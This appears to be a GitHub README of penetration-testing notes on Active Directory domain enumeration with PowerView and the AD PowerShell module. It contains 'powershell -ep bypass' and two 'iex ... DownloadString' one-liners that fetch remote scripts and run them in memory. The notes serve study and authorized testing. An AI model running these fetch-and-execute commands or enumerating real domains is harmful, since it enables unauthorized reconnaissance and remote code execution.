<div align="center">
<h1> Attacking and Defending Active Directory :nepal: </h1>
<a href="https://twitter.com/nirajkharel7" ><img src="https://img.shields.io/twitter/follow/nirajkharel7?style=social" /> </a>
</div>

## Domain Enumerationn Part 1
- The enumeration can be done by using Native executables and .NET classes
- `$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]`
- `$ADClass::GetCurrentDomain()`
- Where `DirectoryServices.ActiveDirectory.Domain` is a class and `GetCurrentDomain()` is a static method.

**Domain Enumeration with Powerview and AD PowerShell module**
- To speed up things we can use Powerview:
- `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`

- The Active Directory PowerShell module
- `https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps`
- `https://github.com/samratashok/ADModule`
- (To use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid ActiveDirectory module DLL)

**Run unrestricted commands with powershell**
- `powershell -ep bypass`
- **Powerview Script Download**
- `iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/PowerView.ps1')`
- **ActiveDirectory Module Download**
- `https://github.com/samratashok/ADModule` Download and Execute with `. .\Import-ActiveDirectory.ps1;Import-ActiveDirectory`
-  or
- `iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory `

**Get Current Domain**
- `Get-NetDomain` (Powerview)
- `Get-ADDomain` (ActiveDirectory Module)

**Get object of another domain**
- `Get-NetDomain -Domain <domain-name>`
- `Get-ADDomain -Identity <domain-name>`

**Get Domain SID for the current domain**
- `Get-DomainSID`
- `(Get-ADDomain).DomainSID`

**Get domain policy for the current domain**
- `Get-DomainPolicy`
- `(Get-DomainPolicy)."system acccess"`

**Get domain policy for another domain**
- `(Get-DomainPolicy -domain moneycorp.local)".system access"`
